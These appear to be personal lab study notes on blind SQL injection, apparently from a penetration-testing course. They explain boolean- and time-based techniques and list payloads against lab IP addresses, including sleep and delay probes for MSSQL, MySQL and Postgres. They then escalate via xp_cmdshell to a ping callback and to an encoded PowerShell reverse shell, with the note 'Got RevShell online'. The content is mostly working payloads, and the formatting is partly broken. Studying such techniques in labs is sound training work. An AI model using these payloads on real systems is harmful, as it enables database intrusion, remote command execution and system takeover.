# SQLi Blind
- Used when SQL query response is not VISIBLE.
- Tehnically, this response is NOT returned in-band, as we can't see the result of our query
- Can be Time-based, or Boolean
- Generic boolean-based blind SQL injections cause the application to return different and predictable values whenever the database query returns a TRUE or FALSE result.
- Time-based blind SQL injections infer the query results by instructing the database to wait for a specified amount of time. Based on the response time, the attacker can conclude if the statement is TRUE or FALSE.

```shell
# BOOLEAN test
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //

' # Time-Based, if it hangs, it's TRUE, automate with SQLMAP
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //

- MSSQL server, with web for vulnerabel to SQLi, 
- found login form on website at /login.aspx
- Lab hint suggest to test for  DB type with time based delay.   Time based delay commands are 
```sql
# MSSQL
'; WAITFOR DELAY '0:0:5' --+-  

# MySQL
 ' AND (SELECT 5 FROM (SELECT(SLEEP(5)))a) AND '1'='1
 
 # Postgress
 ' AND 5=PG_SLEEP(5) AND '1'='1


# Blind SQLi

# listen on Kali
sudo tcpdump -i tun0 icmp   

#  send ping 
'; EXEC xp_cmdshell 'ping -n 1 192.168.45.241' --+-

# sent reverse encoded powershell shell
 ; EXEC xp_cmdshell 'powershell -e JABjAGwpaa==' --+-
 
#  Got  RevShell  online
